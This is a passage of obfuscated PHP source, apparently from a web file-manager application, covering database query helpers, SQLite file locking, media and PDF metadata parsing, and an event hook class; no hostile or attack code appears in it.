163\x63\150\x65\x6d\141\x2e\143\x6f\154\x75\x6d\156\x73\40\101\123\40\143\xa\x9\11\x4f\116\x20\40\x74\x2e\x74\141\142\x6c\x65\x5f\x63\141\x74\x61\154\157\x67\40\75\40\143\56\164\141\142\x6c\145\137\x63\141\164\x61\154\x6f\x67\xa\11\x9\101\116\104\40\x74\56\164\141\142\x6c\x65\137\163\143\150\x65\155\x61\40\x3d\x20\x63\56\164\x61\142\154\145\x5f\x73\143\x68\145\155\x61\xa\11\x9\101\116\104\40\x74\x2e\x74\141\x62\154\145\x5f\x6e\x61\x6d\145\40\x3d\40\x63\x2e\164\x61\142\x6c\x65\x5f\x6e\141\155\145\12\x9\x9\x57\110\x45\x52\105\40\x20\40\164\x2e\x74\x61\142\x6c\x65\x5f\156\x61\155\x65\40\x3d\x20\x27{$e°µ¨ö²½Û}\47"; break; case $dµ¯ŠÙÅ[843]: $aíòÒÁÌíÄ = $dµ¯ŠÙÅ[844] . $e°µ¨ö²½Û . $dµ¯ŠÙÅ[845]; break; case $dµ¯ŠÙÅ[825]: case $dµ¯ŠÙÅ[827]: $aíòÒÁÌíÄ = $dµ¯ŠÙÅ[846] . $dµ¯ŠÙÅ[847] . $dµ¯ŠÙÅ[848] . strtoupper($e°µ¨ö²½Û) . $dµ¯ŠÙÅ[849] . strtoupper($e°µ¨ö²½Û) . $dµ¯ŠÙÅ[850]; break; case $dµ¯ŠÙÅ[851]: $aíòÒÁÌíÄ = $dµ¯ŠÙÅ[852] . $e°µ¨ö²½Û . $dµ¯ŠÙÅ[853]; break; case $dµ¯ŠÙÅ[826]: break; case $dµ¯ŠÙÅ[854]: default: $aíòÒÁÌíÄ = $dµ¯ŠÙÅ[855] . ($this->dbType == $dµ¯ŠÙÅ[854] ? "\140{$e°µ¨ö²½Û}\140" : $e°µ¨ö²½Û); } } goto f‰ªŠÁØÔŸ; bÂ„½íŞ‚Å: } public function getTables($d®ñŒÇâÓ = '') { $d‹ø³ºä©Ÿ =& $_SERVER[Ö]; if (think_config($d‹ø³ºä©Ÿ[857])) { $C—£»Ùßéë = str_replace($d‹ø³ºä©Ÿ[858], $d®ñŒÇâÓ, think_config($d‹ø³ºä©Ÿ[857])); } else { switch ($this->dbType) { case $d‹ø³ºä©Ÿ[825]: case $d‹ø³ºä©Ÿ[827]: $C—£»Ùßéë = $d‹ø³ºä©Ÿ[859]; break; case $d‹ø³ºä©Ÿ[824]: case $d‹ø³ºä©Ÿ[842]: $C—£»Ùßéë = $d‹ø³ºä©Ÿ[860]; break; case $d‹ø³ºä©Ÿ[851]: $C—£»Ùßéë = $d‹ø³ºä©Ÿ[861]; break; case $d‹ø³ºä©Ÿ[826]: think_exception(think_lang($d‹ø³ºä©Ÿ[862]) . $d‹ø³ºä©Ÿ[863]); break; case $d‹ø³ºä©Ÿ[843]: $C—£»Ùßéë = $d‹ø³ºä©Ÿ[42] . $d‹ø³ºä©Ÿ[43] . $d‹ø³ºä©Ÿ[44]; break; case $d‹ø³ºä©Ÿ[854]: default: if (!empty($d®ñŒÇâÓ)) { $C—£»Ùßéë = $d‹ø³ºä©Ÿ[807] . $d®ñŒÇâÓ; } else { $C—£»Ùßéë = $d‹ø³ºä©Ÿ[808]; } } } $E‰âŒõ¥Ú = $this->query($C—£»Ùßéë); $a¢³™Á‘ÏÉ = array(); foreach ($E‰âŒõ¥Ú as $EšÎ·ñÙµä => $E¨¢¸‡Œí’) { $a¢³™Á‘ÏÉ[$EšÎ·ñÙµä] = current($E¨¢¸‡Œí’); } return $a¢³™Á‘ÏÉ; } protected function parseLimit($fÄÇ›øá»Á) { $Dã°¾£øÀ× =& $_SERVER[Ö]; $eê³—÷â = $Dã°¾£øÀ×[33]; if (!empty($fÄÇ›øá»Á)) { switch ($this->dbType) { case $Dã°¾£øÀ×[851]: case $Dã°¾£øÀ×[843]: $fÄÇ›øá»Á = explode($Dã°¾£øÀ×[47], $fÄÇ›øá»Á); if (count($fÄÇ›øá»Á) > 1) { $eê³—÷â .= $Dã°¾£øÀ×[48] . $fÄÇ›øá»Á[1] . $Dã°¾£øÀ×[49] . $fÄÇ›øá»Á[0] . $Dã°¾£øÀ×[50]; } else { $eê³—÷â .= $Dã°¾£øÀ×[48] . $fÄÇ›øá»Á[0] . $Dã°¾£øÀ×[50]; } break; case $Dã°¾£øÀ×[824]: case $Dã°¾£øÀ×[842]: break; case $Dã°¾£øÀ×[826]: break; case $Dã°¾£øÀ×[825]: case $Dã°¾£øÀ×[827]: break; case $Dã°¾£øÀ×[854]: default: $eê³—÷â .= $Dã°¾£øÀ×[48] . $fÄÇ›øá»Á . $Dã°¾£øÀ×[50]; } } return $eê³—÷â; } public function parseKey(&$a¾óÙçÔĞ¢, $BÆÁª“º„Ö = true) { $dôÍØÄÚ’Õ =& $_SERVER[Ö]; if ($BÆÁª“º„Ö) { $a¾óÙçÔĞ¢ = $this->parseKeyCheck($a¾óÙçÔĞ¢); } if ($this->dbType == $dôÍØÄÚ’Õ[854]) { if ($a¾óÙçÔĞ¢ != $dôÍØÄÚ’Õ[172] && !preg_match($dôÍØÄÚ’Õ[818], $a¾óÙçÔĞ¢)) { $a¾óÙçÔĞ¢ = $dôÍØÄÚ’Õ[819] . trim($a¾óÙçÔĞ¢, $dôÍØÄÚ’Õ[819]) . $dôÍØÄÚ’Õ[819]; } return $a¾óÙçÔĞ¢; } else { return parent::parseKey($a¾óÙçÔĞ¢); } } public function close() { $this->_linkID = null; } public function error() { $EÓ‚“´‘Ùƒ =& $_SERVER[Ö]; if ($this->PDOStatement) { $c©æŞùï­½ = $this->PDOStatement->errorInfo(); $this->error = $c©æŞùï­½[1] . $EÓ‚“´‘Ùƒ[4] . $c©æŞùï­½[2]; } else { $this->error = $EÓ‚“´‘Ùƒ[33]; } if ($EÓ‚“´‘Ùƒ[33] != $this->queryStr) { $this->error .= LNG($EÓ‚“´‘Ùƒ[45]) . $this->queryStr; } think_trace($this->error, $EÓ‚“´‘Ùƒ[33], $EÓ‚“´‘Ùƒ[46]); return $this->error; } public function escapeString($f¬Â–ß§…’) { $EæšÚ ³ƒİ =& $_SERVER[Ö]; switch ($this->dbType) { case $EæšÚ ³ƒİ[851]: case $EæšÚ ³ƒİ[824]: case $EæšÚ ³ƒİ[842]: case $EæšÚ ³ƒİ[854]: return addslashes($f¬Â–ß§…’); case $EæšÚ ³ƒİ[826]: case $EæšÚ ³ƒİ[843]: case $EæšÚ ³ƒİ[825]: case $EæšÚ ³ƒİ[827]: return str_ireplace($EæšÚ ³ƒİ[55], $EæšÚ ³ƒİ[56], $f¬Â–ß§…’); } } protected function parseValue($eáÁã‚ä‹¼) { $FÔ›Ô¦ÑÅÎ =& $_SERVER[Ö]; if (is_string($eáÁã‚ä‹¼)) { $eáÁã‚ä‹¼ = strpos($eáÁã‚ä‹¼, $FÔ›Ô¦ÑÅÎ[4]) === 0 ? $this->escapeString($eáÁã‚ä‹¼) : $FÔ›Ô¦ÑÅÎ[864] . $this->escapeString($eáÁã‚ä‹¼) . $FÔ›Ô¦ÑÅÎ[864]; } elseif (isset($eáÁã‚ä‹¼[0]) && is_string($eáÁã‚ä‹¼[0]) && strtolower($eáÁã‚ä‹¼[0]) == $FÔ›Ô¦ÑÅÎ[281]) { $eáÁã‚ä‹¼ = $this->escapeString($eáÁã‚ä‹¼[1]); } elseif (is_array($eáÁã‚ä‹¼)) { $eáÁã‚ä‹¼ = array_map(array($this, $FÔ›Ô¦ÑÅÎ[865]), $eáÁã‚ä‹¼); } elseif (is_bool($eáÁã‚ä‹¼)) { $eáÁã‚ä‹¼ = $eáÁã‚ä‹¼ ? $FÔ›Ô¦ÑÅÎ[83] : $FÔ›Ô¦ÑÅÎ[464]; } elseif (is_null($eáÁã‚ä‹¼)) { $eáÁã‚ä‹¼ = $FÔ›Ô¦ÑÅÎ[99]; } return $eáÁã‚ä‹¼; } public function getLastInsertId() { $F£¯™‰³± =& $_SERVER[Ö]; switch ($this->dbType) { case $F£¯™‰³±[851]: case $F£¯™‰³±[843]: case $F£¯™‰³±[824]: case $F£¯™‰³±[842]: case $F£¯™‰³±[826]: case $F£¯™‰³±[854]: return $this->_linkID->lastInsertId(); case $F£¯™‰³±[825]: case $F£¯™‰³±[827]: $f¿„ÁÇé‰É = $this->table; $FŠË¼¦ƒÌõ = $this->query("\x53\x45\x4c\x45\103\x54\x20{$f¿„ÁÇé‰É}\56\x63\x75\x72\162\x76\141\x6c\x20\x63\x75\162\x72\166\x61\154\40\x46\x52\117\115\40\x64\165\x61\154"); return $FŠË¼¦ƒÌõ ? $FŠË¼¦ƒÌõ[0][$F£¯™‰³±[866]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($cÌİº¢«ÂÉ) { goto aØšÃö„Ç; Cœö¯”ªŠ: fclose($AÊå¼œ); show_json($F„³Ä×î£µ[869], !1); return !1; goto EÕÖœ¬ùÀ—; aØšÃö„Ç: $F„³Ä×î£µ =& $_SERVER[Ö]; $eÅœò…ìŞ = DATA_PATH . $F„³Ä×î£µ[867]; $AÊå¼œ = fopen($eÅœò…ìŞ, $F„³Ä×î£µ[868]); goto AÉïİ§â²‹; AÉïİ§â²‹: if (!$AÊå¼œ) { return !1; } if (flock($AÊå¼œ, LOCK_EX)) { $FÖØø˜®àŠ = parent::query($cÌİº¢«ÂÉ); flock($AÊå¼œ, LOCK_UN); fclose($AÊå¼œ); return $FÖØø˜®àŠ; } flock($AÊå¼œ, LOCK_UN); goto Cœö¯”ªŠ; EÕÖœ¬ùÀ—: } public function execute($fİäõ¨Àšö) { goto F‚ìá÷Ÿ ö; F‚ìá÷Ÿ ö: $Eàç³¸Òé =& $_SERVER[Ö]; $F•ÈØå¶… = DATA_PATH . $Eàç³¸Òé[867]; $b¯¹Í’ºÖ = fopen($F•ÈØå¶…, $Eàç³¸Òé[868]); goto dÅåéÚÃ‘Ğ; bºŒ‰Ó¯‡Ÿ: fclose($b¯¹Í’ºÖ); show_json($Eàç³¸Òé[869], !1); return !1; goto d†×Ì¶öÆ; dÅåéÚÃ‘Ğ: if (!$b¯¹Í’ºÖ) { return !1; } if (flock($b¯¹Í’ºÖ, LOCK_EX)) { $D‘‹‰ŒÚ¸ = parent::execute($fİäõ¨Àšö); flock($b¯¹Í’ºÖ, LOCK_UN); fclose($b¯¹Í’ºÖ); return $D‘‹‰ŒÚ¸; } flock($b¯¹Í’ºÖ, LOCK_UN); goto bºŒ‰Ó¯‡Ÿ; d†×Ì¶öÆ: } } goto b›¥ëÏ¸Ÿ; A•Œ’²ÆĞ: class GetInfo { private static $fileTypeArray; public static function get($c ÚŸ×›‘) { $f¿ŒœõáË = IO::info($c ÚŸ×›‘); return self::infoAdd($f¿ŒœõáË); } public static function infoAdd(&$eâŒˆ»º) { goto CâÃ“àÅ; FĞ¢§­í¾: $fŒÂ‹¿³¦± = $eâŒˆ»º[$FéóÖ×ô®ˆ[156]]; try { if ($eâŒˆ»º[$FéóÖ×ô®ˆ[156]] == $FéóÖ×ô®ˆ[1587]) { $aˆĞöå¶œº = self::psdParse($d—ŒŒ„Öö); $fŒÂ‹¿³¦± = $FéóÖ×ô®ˆ[1588]; } else { if ($eâŒˆ»º[$FéóÖ×ô®ˆ[156]] == $FéóÖ×ô®ˆ[1589]) { $aˆĞöå¶œº = self::pdfParse($d—ŒŒ„Öö); } else { $fŒÂ‹¿³¦± = self::$fileTypeArray[$FéóÖ×ô®ˆ[1590]][$eâŒˆ»º[$FéóÖ×ô®ˆ[156]]]; $bÄê®ÚÍœ¤ = self::$fileTypeArray[$FéóÖ×ô®ˆ[1591]][$fŒÂ‹¿³¦±][$FéóÖ×ô®ˆ[1592]]; $aèîÄŞ÷¬™ = @$DŸ°¾¸‘¹->analyze($d—ŒŒ„Öö, $eâŒˆ»º[$FéóÖ×ô®ˆ[77]], $eâŒˆ»º[$FéóÖ×ô®ˆ[28]]); $aˆĞöå¶œº = self::parseData($aèîÄŞ÷¬™, $bÄê®ÚÍœ¤, $eâŒˆ»º); } } } catch (Exception $dÂ†©¨Éê¨) { $aˆĞöå¶œº = array($FéóÖ×ô®ˆ[368] => $fŒÂ‹¿³¦±); } if (!$aˆĞöå¶œº) { return; } goto f©Ä¹áŠ; C¦Ô³İ«Ù: if (!$eâŒˆ»º || $eâŒˆ»º[$FéóÖ×ô®ˆ[29]] != $FéóÖ×ô®ˆ[163]) { return; } if (!self::support($eâŒˆ»º[$FéóÖ×ô®ˆ[156]]) || isset($eâŒˆ»º[$FéóÖ×ô®ˆ[422]])) { return; } $d—ŒŒ„Öö = $FéóÖ×ô®ˆ[1586] . $eâŒˆ»º[$FéóÖ×ô®ˆ[75]]; goto FĞ¢§­í¾; CâÃ“àÅ: $FéóÖ×ô®ˆ =& $_SERVER[Ö]; static $DŸ°¾¸‘¹; if (!$DŸ°¾¸‘¹) { require SDK_DIR . $FéóÖ×ô®ˆ[1585]; $DŸ°¾¸‘¹ = new getID3(); } goto C¦Ô³İ«Ù; f©Ä¹áŠ: $aˆĞöå¶œº[$FéóÖ×ô®ˆ[368]] = $fŒÂ‹¿³¦±; $eâŒˆ»º[$FéóÖ×ô®ˆ[422]] = $aˆĞöå¶œº; return $eâŒˆ»º; goto a—¾—Çƒ”; a—¾—Çƒ”: } public static function support($DÛÇ¯±ø÷é) { goto Bœ‰è‡ßµù; Bœ‰è‡ßµù: $e—ÔĞÎÆÎ  =& $_SERVER[Ö]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $DÛÇ¯±ø÷é = strtolower($DÛÇ¯±ø÷é); goto däÔ«¢ƒìâ; fšƒ¨Â¾–é: return !1; goto aÙ°æ›‚ˆì; däÔ«¢ƒìâ: $cË Ì—è´Ô = array($e—ÔĞÎÆÎ [1589], $e—ÔĞÎÆÎ [1587]); if (in_array($DÛÇ¯±ø÷é, $cË Ì—è´Ô)) { return !0; } if (isset(self::$fileTypeArray[$e—ÔĞÎÆÎ [1590]][$DÛÇ¯±ø÷é])) { return !0; } goto fšƒ¨Â¾–é; aÙ°æ›‚ˆì: } private static function parseData($f““êäµ¿ˆ, $BÎÄÆá©à°, $c¡„ë‰¸¬³) { $f©ä˜¸»Ä· =& $_SERVER[Ö]; $fÌ¶ÏŸæø¹ = $f““êäµ¿ˆ[$f©ä˜¸»Ä·[1593]]; $a˜š‘¸“‰Ò = array(); foreach ($BÎÄÆá©à° as $EƒÃ¢Ş¬‘ => $B÷Ø‰½£«) { foreach ($B÷Ø‰½£« as $AÍ×–›î™Æ) { if (is_array($AÍ×–›î™Æ)) { $C½±ê°–º = self::parseData($f““êäµ¿ˆ, $B÷Ø‰½£«, $c¡„ë‰¸¬³); if ($C½±ê°–º) { $a˜š‘¸“‰Ò[$EƒÃ¢Ş¬‘] = $C½±ê°–º; } break; } $c»»ê¼²‡« = str_replace($f©ä˜¸»Ä·[1367], $fÌ¶ÏŸæø¹, $AÍ×–›î™Æ); $C½±ê°–º = _get($f““êäµ¿ˆ, $c»»ê¼²‡«); $C½±ê°–º = is_array($C½±ê°–º) ? $C½±ê°–º[0] : $C½±ê°–º; if ($C½±ê°–º) { break; } } if ($C½±ê°–º || $C½±ê°–º === 0 || $C½±ê°–º === !1) { $C½±ê°–º = self::valueReset($AÍ×–›î™Æ, $C½±ê°–º, $EƒÃ¢Ş¬‘); if ($C½±ê°–º !== null) { $a˜š‘¸“‰Ò[$EƒÃ¢Ş¬‘] = $C½±ê°–º; } } } $a˜š‘¸“‰Ò = self::valueResetAll($a˜š‘¸“‰Ò, $c¡„ë‰¸¬³); return $a˜š‘¸“‰Ò; } private static function psdParse($eì¤å’Ğïª) { $E›ÇññÕèø =& $_SERVER[Ö]; if (IO::fileSubstr($eì¤å’Ğïª, 0, 4) != $E›ÇññÕèø[1594]) { return !1; } $EÆËõéøº– = getImageSize($eì¤å’Ğïª, $B †ƒ•ÜÖæ); if (!$EÆËõéøº–) { return; } $Eæ¼ÔÊ¶–Ñ = array($E›ÇññÕèø[1509] => $EÆËõéøº–[0], $E›ÇññÕèø[1511] => $EÆËõéøº–[1]); return $Eæ¼ÔÊ¶–Ñ; } private static function pdfParse($AÔ±Øøã‡) { return FileParsePdf::parse($AÔ±Øøã‡); } private static function fileTypeParse() { $cÌŸèİìˆò =& $_SERVER[Ö]; $dÕ´¨èï—¥ = self::fileTypeArray(); $d…ÔÄ¿Äò = array(); foreach ($dÕ´¨èï—¥ as $f´›ßˆîÖÖ => $AºÇÇî­Èá) { $c¾¢ˆù‹ö‘ = _get($AºÇÇî­Èá, $cÌŸèİìˆò[156], $cÌŸèİìˆò[33]); $a„Î¸°ğİ÷ = is_string($c¾¢ˆù‹ö‘) ? explode($cÌŸèİìˆò[47], $c¾¢ˆù‹ö‘) : $c¾¢ˆù‹ö‘; if (!$a„Î¸°ğİ÷) { continue; } foreach ($a„Î¸°ğİ÷ as $c¾¢ˆù‹ö‘) { $c¾¢ˆù‹ö‘ = strtolower(trim($c¾¢ˆù‹ö‘)); if (!$c¾¢ˆù‹ö‘) { continue; } $d…ÔÄ¿Äò[$c¾¢ˆù‹ö‘] = $f´›ßˆîÖÖ; } $dÕ´¨èï—¥[$f´›ßˆîÖÖ][$cÌŸèİìˆò[156]] = array_keys($d…ÔÄ¿Äò); $dÕ´¨èï—¥[$f´›ßˆîÖÖ][$cÌŸèİìˆò[1592]] = self::parseKeyMap($AºÇÇî­Èá[$cÌŸèİìˆò[1592]]); } return array($cÌŸèİìˆò[1591] => $dÕ´¨èï—¥, $cÌŸèİìˆò[1590] => $d…ÔÄ¿Äò); } private static function parseKeyMap($C¾‹°˜­Œ˜) { $c†Áê¾ŞÔ =& $_SERVER[Ö]; foreach ($C¾‹°˜­Œ˜ as $A÷ğ¶À¡™ => $D“‰Ü„—ƒ) { if (is_array($D“‰Ü„—ƒ)) { $D²ö‘Ü¿ = self::parseKeyMap($D“‰Ü„—ƒ); if ($D²ö‘Ü¿) { $C¾‹°˜­Œ˜[$A÷ğ¶À¡™] = $D²ö‘Ü¿; } continue; } $Bªğ†½ = explode($c†Áê¾ŞÔ[47], $D“‰Ü„—ƒ); $e¤ŞÙİˆÙ² = array(); foreach ($Bªğ†½ as $bŸ³®”¾‚) { $bŸ³®”¾‚ = trim($bŸ³®”¾‚); if (!$bŸ³®”¾‚) { continue; } if (preg_match($c†Áê¾ŞÔ[1595], $bŸ³®”¾‚, $eÎ‹Î‰«·ë)) { $F‹ßƒ›æã™ = explode($c†Áê¾ŞÔ[267], $eÎ‹Î‰«·ë[1]); foreach ($F‹ßƒ›æã™ as $a¸‚¤¾ÔÎ) { $e¤ŞÙİˆÙ²[] = str_replace($eÎ‹Î‰«·ë[0], $a¸‚¤¾ÔÎ, $bŸ³®”¾‚); } } else { $e¤ŞÙİˆÙ²[] = $bŸ³®”¾‚; } } $C¾‹°˜­Œ˜[$A÷ğ¶À¡™] = $e¤ŞÙİˆÙ²; } return $C¾‹°˜­Œ˜; } private static function valueResetAll($e†¼‡œïæ…, $BŸÀªƒ¬) { goto A“¨´ÖáÇã; cù™ÑÓƒ: return $e†¼‡œïæ…; goto eà•¢ŠéˆŒ; A“¨´ÖáÇã: $bÙºÄ¡Ç =& $_SERVER[Ö]; if (isset($e†¼‡œïæ…[$bÙºÄ¡Ç[1596]])) { $e†– ª—• = ceil($e†¼‡œïæ…[$bÙºÄ¡Ç[1596]]); $bàÉÄŠ“³ = intval($e†– ª—• / 3600); $f“†À¨»‚’ = intval(($e†– ª—• - $bàÉÄŠ“³ * 3600) / 60); $F³ê»ğ­ = $e†– ª—• % 60; $e†¼‡œïæ…[$bÙºÄ¡Ç[1597]] = sprintf($bÙºÄ¡Ç[1598], $bàÉÄŠ“³, $f“†À¨»‚’, $F³ê»ğ­); if ($bàÉÄŠ“³ == 0) { $e†¼‡œïæ…[$bÙºÄ¡Ç[1597]] = sprintf($bÙºÄ¡Ç[1599], $f“†À¨»‚’, $F³ê»ğ­); } } $cÒ‰‘âñà = _get($e†¼‡œïæ…, $bÙºÄ¡Ç[1600]); goto A‹Û±¶‰‹¿; E±¢Á‚’ñœ: $cô¥÷Ü™“ = _get($e†¼‡œïæ…, $bÙºÄ¡Ç[1608], $bÙºÄ¡Ç[33]); $eÕÖã‡İ®« = $eƒ™ô¼À³î . $e•ğ®íÁÄà . $cô¥÷Ü™“; if ($eÕÖã‡İ®« && get_charset($eÕÖã‡İ®«) != $bÙºÄ¡Ç[322]) { $e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1320]] = iconv_to($e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1320]], get_charset($eÕÖã‡İ®«), $bÙºÄ¡Ç[322]); $e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1609]] = iconv_to($e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1609]], get_charset($eÕÖã‡İ®«), $bÙºÄ¡Ç[322]); $e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1610]] = iconv_to($e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1610]], get_charset($eÕÖã‡İ®«), $bÙºÄ¡Ç[322]); } goto cù™ÑÓƒ; A‹Û±¶‰‹¿: if ($cÒ‰‘âñà) { $Aù•Ë‰®§¤ = IO_PATH_SYSTEM_TEMP . $bÙºÄ¡Ç[1601] . KodIO::hashPath($BŸÀªƒ¬) . $bÙºÄ¡Ç[1602]; $e†¼‡œïæ…[$bÙºÄ¡Ç[1603]] = Action($bÙºÄ¡Ç[1604])->pluginCacheFileSet($Aù•Ë‰®§¤, $cÒ‰‘âñà); unset($e†¼‡œïæ…[$bÙºÄ¡Ç[1605]][$bÙºÄ¡Ç[1588]]); } $eƒ™ô¼À³î = _get($e†¼‡œïæ…, $bÙºÄ¡Ç[1606], $bÙºÄ¡Ç[33]); $e•ğ®íÁÄà = _get($e†¼‡œïæ…, $bÙºÄ¡Ç[1607], $bÙºÄ¡Ç[33]); goto E±¢Á‚’ñœ; eà•¢ŠéˆŒ: } private static function valueReset($C¹¦¥µöĞ¥, $B‘ÕëğÃÖ‚, $e¹æÊ‘àòÆ) { $Dõ†½õÑå´ =& $_SERVER[Ö]; $AË‘ç„ƒÃ‰ = $Dõ†½õÑå´[1526]; switch ($C¹¦¥µöĞ¥) { case $Dõ†½õÑå´[1611]: $B‘ÕëğÃÖ‚ = $B‘ÕëğÃÖ‚ == $Dõ†½õÑå´[83] ? $Dõ†½õÑå´[1612] : $Dõ†½õÑå´[1613]; break; case $Dõ†½õÑå´[1614]: $B‘ÕëğÃÖ‚ = $B‘ÕëğÃÖ‚ ? $B‘ÕëğÃÖ‚ : null; break; default: break; } switch ($e¹æÊ‘àòÆ) { case $Dõ†½õÑå´[1615]: $B‘ÕëğÃÖ‚ = round($B‘ÕëğÃÖ‚, 2); break; case $Dõ†½õÑå´[183]: case $Dõ†½õÑå´[106]: if ($B‘ÕëğÃÖ‚ < 0) { $B‘ÕëğÃÖ‚ = null; } else { if (is_numeric($B‘ÕëğÃÖ‚)) { $B‘ÕëğÃÖ‚ = date($AË‘ç„ƒÃ‰, $B‘ÕëğÃÖ‚); } } break; default: break; } return $B‘ÕëğÃÖ‚; } private static function fileTypeArray() { $cØÏÊ«¦Ú =& $_SERVER[Ö]; return array($cØÏÊ«¦Ú[1588] => array($cØÏÊ«¦Ú[156] => $cØÏÊ«¦Ú[1616] . $cØÏÊ«¦Ú[1617], $cØÏÊ«¦Ú[1592] => array($cØÏÊ«¦Ú[1509] => $cØÏÊ«¦Ú[1618], $cØÏÊ«¦Ú[1511] => $cØÏÊ«¦Ú[1619], $cØÏÊ«¦Ú[1620] => $cØÏÊ«¦Ú[1621], $cØÏÊ«¦Ú[1622] => $cØÏÊ«¦Ú[1623], $cØÏÊ«¦Ú[183] => $cØÏÊ«¦Ú[1624], $cØÏÊ«¦Ú[106] => $cØÏÊ«¦Ú[1625], $cØÏÊ«¦Ú[1626] => $cØÏÊ«¦Ú[1627], $cØÏÊ«¦Ú[1628] => $cØÏÊ«¦Ú[1629], $cØÏÊ«¦Ú[1630] => $cØÏÊ«¦Ú[1631], $cØÏÊ«¦Ú[1632] => $cØÏÊ«¦Ú[1633], $cØÏÊ«¦Ú[1634] => $cØÏÊ«¦Ú[1635], $cØÏÊ«¦Ú[1636] => $cØÏÊ«¦Ú[1637], $cØÏÊ«¦Ú[1638] => $cØÏÊ«¦Ú[1639], $cØÏÊ«¦Ú[1640] => array($cØÏÊ«¦Ú[1641] => $cØÏÊ«¦Ú[1642], $cØÏÊ«¦Ú[1643] => $cØÏÊ«¦Ú[1644], $cØÏÊ«¦Ú[1645] => $cØÏÊ«¦Ú[1646]), $cØÏÊ«¦Ú[1647] => $cØÏÊ«¦Ú[1648], $cØÏÊ«¦Ú[1649] => $cØÏÊ«¦Ú[1650], $cØÏÊ«¦Ú[1651] => $cØÏÊ«¦Ú[1652], $cØÏÊ«¦Ú[1653] => $cØÏÊ«¦Ú[1654], $cØÏÊ«¦Ú[1655] => array($cØÏÊ«¦Ú[1656] => $cØÏÊ«¦Ú[1657], $cØÏÊ«¦Ú[1658] => $cØÏÊ«¦Ú[1659], $cØÏÊ«¦Ú[1660] => $cØÏÊ«¦Ú[1661], $cØÏÊ«¦Ú[1662] => $cØÏÊ«¦Ú[1663], $cØÏÊ«¦Ú[1664] => $cØÏÊ«¦Ú[1665], $cØÏÊ«¦Ú[1666] => $cØÏÊ«¦Ú[1667], $cØÏÊ«¦Ú[1668] => $cØÏÊ«¦Ú[1669], $cØÏÊ«¦Ú[1670] => $cØÏÊ«¦Ú[1671], $cØÏÊ«¦Ú[1672] => $cØÏÊ«¦Ú[1673], $cØÏÊ«¦Ú[1674] => $cØÏÊ«¦Ú[1675], $cØÏÊ«¦Ú[1676] => $cØÏÊ«¦Ú[1677]))), $cØÏÊ«¦Ú[1678] => array($cØÏÊ«¦Ú[156] => $cØÏÊ«¦Ú[1679] . $cØÏÊ«¦Ú[1680], $cØÏÊ«¦Ú[1592] => array($cØÏÊ«¦Ú[1596] => $cØÏÊ«¦Ú[1681], $cØÏÊ«¦Ú[183] => $cØÏÊ«¦Ú[1682], $cØÏÊ«¦Ú[106] => $cØÏÊ«¦Ú[1683], $cØÏÊ«¦Ú[1628] => $cØÏÊ«¦Ú[1684], $cØÏÊ«¦Ú[1685] => $cØÏÊ«¦Ú[1686], $cØÏÊ«¦Ú[1687] => $cØÏÊ«¦Ú[1614], $cØÏÊ«¦Ú[1688] => $cØÏÊ«¦Ú[1689], $cØÏÊ«¦Ú[1690] => $cØÏÊ«¦Ú[1691], $cØÏÊ«¦Ú[1692] => $cØÏÊ«¦Ú[1693], $cØÏÊ«¦Ú[1605] => array($cØÏÊ«¦Ú[1320] => $cØÏÊ«¦Ú[1694], $cØÏÊ«¦Ú[1609] => $cØÏÊ«¦Ú[1695], $cØÏÊ«¦Ú[1610] => $cØÏÊ«¦Ú[1696], $cØÏÊ«¦Ú[1697] => $cØÏÊ«¦Ú[1698], $cØÏÊ«¦Ú[1699] => $cØÏÊ«¦Ú[1700], $cØÏÊ«¦Ú[1701] => $cØÏÊ«¦Ú[1702], $cØÏÊ«¦Ú[1588] => $cØÏÊ«¦Ú[1703]))), $cØÏÊ«¦Ú[1704] => array($cØÏÊ«¦Ú[156] => $cØÏÊ«¦Ú[1705] . $cØÏÊ«¦Ú[1706], $cØÏÊ«¦Ú[1592] => array($cØÏÊ«¦Ú[1509] => $cØÏÊ«¦Ú[1707], $cØÏÊ«¦Ú[1511] => $cØÏÊ«¦Ú[1708], $cØÏÊ«¦Ú[1596] => $cØÏÊ«¦Ú[1681], $cØÏÊ«¦Ú[183] => $cØÏÊ«¦Ú[1709], $cØÏÊ«¦Ú[106] => $cØÏÊ«¦Ú[1710], $cØÏÊ«¦Ú[1615] => $cØÏÊ«¦Ú[1711], $cØÏÊ«¦Ú[1692] => $cØÏÊ«¦Ú[1712], $cØÏÊ«¦Ú[1688] => $cØÏÊ«¦Ú[1713], $cØÏÊ«¦Ú[1628] => $cØÏÊ«¦Ú[1714], $cØÏÊ«¦Ú[1678] => array($cØÏÊ«¦Ú[1687] => $cØÏÊ«¦Ú[1614], $cØÏÊ«¦Ú[1715] => $cØÏÊ«¦Ú[1716], $cØÏÊ«¦Ú[1685] => $cØÏÊ«¦Ú[1686], $cØÏÊ«¦Ú[1692] => $cØÏÊ«¦Ú[1693], $cØÏÊ«¦Ú[1688] => $cØÏÊ«¦Ú[1717], $cØÏÊ«¦Ú[1690] => $cØÏÊ«¦Ú[1691]))), $cØÏÊ«¦Ú[1718] => array($cØÏÊ«¦Ú[1592] => array($cØÏÊ«¦Ú[1719] => $cØÏÊ«¦Ú[1720], $cØÏÊ«¦Ú[1721] => $cØÏÊ«¦Ú[1722])), $cØÏÊ«¦Ú[1723] => array($cØÏÊ«¦Ú[1592] => array())); } } class Hook { private static $events = array(); public static function get($d¶–ôó²Ì = false) { if (!$d¶–ôó²Ì) { return self::$events; } else { return self::$events[$d¶–ôó²Ì]; } } public static function apply($eã’ŠÍŠö, $f¯ğ±”¿°£ = array()) { $Eƒ‘ŞŸÅ‰ = ActionApply($eã’ŠÍŠö, $f¯ğ±”¿°£); if (is_string($eã’ŠÍŠö)) { Hook::trigger($eã’ŠÍŠö); } return $Eƒ‘ŞŸÅ‰; } public static function bind($F¿–ŒäÇ¦, $A÷¶ÂÏõ»Ñ, $e’Ë•ãÊ¶ = false) { $DÈ™Æ—ÔÔ =& $_SERVER[Ö]; if (!isset(self::$events[$F¿–ŒäÇ¦])) { self::$events[$F¿–ŒäÇ¦] = array(); } 